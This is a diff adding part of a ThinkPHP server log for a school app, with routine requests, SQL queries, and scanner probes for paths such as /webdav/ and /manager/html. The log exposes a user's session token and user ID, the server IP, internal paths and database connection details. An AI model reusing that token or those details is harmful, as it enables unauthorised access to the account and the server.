+  'host' => '148.70.73.177',
+  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G9500 Build/R16NW)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T12:57:51+08:00 ] 60.255.76.130 POST 148.70.73.177/api/users/showinfo
+[运行时间：0.032329s] [吞吐率：30.93req/s] [内存消耗：2,803.84kb] [文件加载：56]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'users',
+    2 => 'showinfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Users->showInfo[ /data/web/php/ischool/application/api/controller/Users.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000490s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.001181s ]
+[ sql ] [ SQL ] SELECT `u`.`user_id`,`username`,`nickname`,`kjmessage_id`,s.sname school,`grade`,`u`.`sex`,`u`.`head_image`,`u`.`background_img`,`u`.`signature`,`user_birth` FROM `users` `u` LEFT JOIN `users_secretary` `us` ON `us`.`user_id`=`u`.`user_id` LEFT JOIN `school` `s` ON `u`.`school`=`s`.`id` WHERE  `u`.`user_id` = '33' LIMIT 1 [ RunTime:0.000493s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `follows` [ RunTime:0.000585s ]
+[ sql ] [ SQL ] SELECT count(id) follows FROM `follows` WHERE  `f_user_id` = 33 LIMIT 1 [ RunTime:0.000238s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `comment_fabulous` [ RunTime:0.000436s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `comment_fabulous` `cf` LEFT JOIN `comment` `c` ON `cf`.`comment_id`=`c`.`id` LEFT JOIN `users` `u` ON `u`.`user_id`=`c`.`user_id` WHERE  `u`.`user_id` = '33'  AND `cf`.`status` = 1 LIMIT 1 [ RunTime:0.000327s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `activity_fabulous` [ RunTime:0.000456s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `activity_fabulous` WHERE  `release_id` = 33 LIMIT 1 [ RunTime:0.000269s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `medal` [ RunTime:0.000555s ]
+[ sql ] [ SQL ] SELECT id medal_id,`medal_name`,`medal_icon` FROM `medal` WHERE  `user_id` = 33 [ RunTime:0.000233s ]
+---------------------------------------------------------------
+[ 2019-02-03T15:15:11+08:00 ] 185.101.33.2 GET /
+[运行时间：0.012181s] [吞吐率：82.09req/s] [内存消耗：1,242.39kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T15:42:13+08:00 ] 132.232.74.188 GET 148.70.73.177:80/webdav/
+[运行时间：0.017585s] [吞吐率：56.87req/s] [内存消耗：1,364.59kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'webdav',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T15:43:14+08:00 ] 132.232.74.188 GET 148.70.73.177/index.php
+[运行时间：0.013788s] [吞吐率：72.53req/s] [内存消耗：1,243.17kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cache-control' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T15:43:17+08:00 ] 132.232.74.188 GET 148.70.73.177/index.php
+[运行时间：0.016130s] [吞吐率：62.00req/s] [内存消耗：1,243.17kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cache-control' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T15:43:21+08:00 ] 132.232.74.188 GET 148.70.73.177/manager/html
+[运行时间：0.011384s] [吞吐率：87.84req/s] [内存消耗：1,365.34kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'manager',
+    1 => 'html',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cache-control' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T15:56:40+08:00 ] 141.237.214.70 GET 148.70.73.177:80/
+[运行时间：0.010240s] [吞吐率：97.66req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T16:09:31+08:00 ] 60.191.0.245 GET /
+[运行时间：0.012245s] [吞吐率：81.67req/s] [内存消耗：1,241.55kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T17:16:35+08:00 ] 5.160.151.254 GET 148.70.73.177:80/
+[运行时间：0.014116s] [吞吐率：70.84req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T17:25:34+08:00 ] 203.208.60.108 GET 148.70.73.177/
+[运行时间：0.011512s] [吞吐率：86.87req/s] [内存消耗：1,245.30kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T18:08:52+08:00 ] 92.29.246.143 GET 148.70.73.177:80/
+[运行时间：0.015950s] [吞吐率：62.70req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T20:12:13+08:00 ] 177.130.245.148 GET 148.70.73.177:80/
+[运行时间：0.011533s] [吞吐率：86.71req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T20:31:01+08:00 ] 89.145.200.58 GET 148.70.73.177:80/
+[运行时间：0.013244s] [吞吐率：75.51req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T21:30:26+08:00 ] 14.17.3.65 GET 148.70.73.177/
+[运行时间：0.015747s] [吞吐率：63.50req/s] [内存消耗：1,245.48kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T21:33:05+08:00 ] 178.34.157.178 GET 148.70.73.177:80/
+[运行时间：0.016236s] [吞吐率：61.59req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T21:46:27+08:00 ] 71.6.202.198 GET 148.70.73.177/ccvv
+[运行时间：0.018132s] [吞吐率：55.15req/s] [内存消耗：1,365.11kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ccvv',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T22:33:00+08:00 ] 51.38.12.21 GET 148.70.73.177/
+[运行时间：0.011749s] [吞吐率：85.11req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '148.70.73.177',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T23:08:44+08:00 ] 191.242.167.11 GET 148.70.73.177:80/
+[运行时间：0.011305s] [吞吐率：88.46req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T23:48:58+08:00 ] 77.35.47.114 GET 148.70.73.177:80/
+[运行时间：0.018213s] [吞吐率：54.91req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
